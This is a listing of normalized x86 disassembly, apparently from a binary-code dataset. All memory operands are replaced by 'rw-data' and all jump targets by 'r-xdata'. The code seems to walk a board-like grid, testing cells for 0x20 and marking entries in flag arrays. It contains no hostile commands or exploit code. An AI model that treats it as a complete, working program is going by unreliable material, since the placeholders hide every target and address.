mov [ rw-data ] edi
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x9
jg r-xdata
mov ecx [ rw-data ]
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ rw-data ]
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
cmp edi 0x5
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov edi [ rw-data ]
cmp edi 0x6
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x8
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ rw-data ]
mov edi [ esi + 0x84 ]
mov esi [ ebp + 0x14 ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x18 ]
nop [ eax ] eax
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x18 ]
mov edi [ rw-data ]
dec edi
cmp edi 0x4
jl r-xdata
cmp ebx 0x8
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov edi [ rw-data ]
dec edi
cmp edi 0x4
jl r-xdata
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
lea edi [ ecx - 0x2 ]
cmp edi 0x1
jl r-xdata
cmp ebx 0x6
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ ecx - 0x2 ]
cmp edi 0x1
jl r-xdata
cmp ebx 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp [ edx + ecx * 4 + 0x4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add ebx 0xfffffffe
inc ecx
cmp ebx 0x1
jl r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ edx + ecx * 4 + 0x4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add ebx 0xfffffffe
inc ecx
cmp ebx 0x1
jl r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
inc ebx
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
inc ebx
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ebx [ rw-data ]
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
lea ecx [ ebx + 0x1 ]
cmp ecx 0x9
jg r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ rw-data ]
lea ecx [ ebx + 0x1 ]
cmp ecx 0x6
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
mov edi [ rw-data ]
mov [ edx + ecx * 4 ] 0x1
mov ebx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
inc edi
add ecx 0x4
cmp edi ebx
jl r-xdata
mov edi [ rw-data ]
lea ecx [ ebx + 0x1 ]
cmp ecx 0x6
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov [ edx + ecx * 4 + 0x800 ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
inc edi
add ecx 0x4
cmp edi ebx
jl r-xdata
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
inc ecx
cmp ecx 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
inc ecx
cmp ecx 0x3
jg r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
add ecx 0x2
cmp ecx 0xa
mov ecx [ rw-data ]
jg r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x2c ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
add ecx 0x2
cmp ecx 0x5
mov ecx [ rw-data ]
jg r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x2c ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
add ecx [ ebp - 0xc ]
cmp [ ebx + ecx * 4 ] 0x20
jne r-xdata
lea ecx [ ebx + 0x1 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ ebx + ecx * 4 ] 0x20
jne r-xdata
lea ecx [ ebx + 0x1 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x4 ] ecx
cmp ebx 0x9
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x4 ] ecx
cmp ebx 0x9
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x8 ] ecx
cmp ebx 0x9
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x8 ] ecx
cmp ebx 0x9
jle r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov edi [ rw-data ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
cmp [ ecx ] 0x20
jne r-xdata
lea ecx [ ebx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov edi [ rw-data ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
cmp [ ecx ] 0x20
jne r-xdata
cmp ebx 0x8
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x6
mov esi [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
cmp [ esi + ecx * 4 - 0x2c ] 0x20
mov esi [ ebp + 0x14 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
cmp ebx 0x1
jmp r-xdata
mov esi [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
cmp [ esi + ecx * 4 - 0x2c ] 0x20
mov esi [ ebp + 0x14 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov ebx [ rw-data ]
inc ecx
add ebx 0xfffffffe
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov ebx [ rw-data ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov ebx [ rw-data ]
inc ecx
add ebx 0xfffffffe
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0x4 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ rw-data ] ecx
inc [ esi + eax * 4 ]
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov ebx [ rw-data ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop [ eax ] eax
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop [ eax + eax ] eax
mov ecx [ ebp - 0xc ]
add ecx ebx
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec ebx
sub ecx 0x30
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
jl r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov edx [ rw-data ]
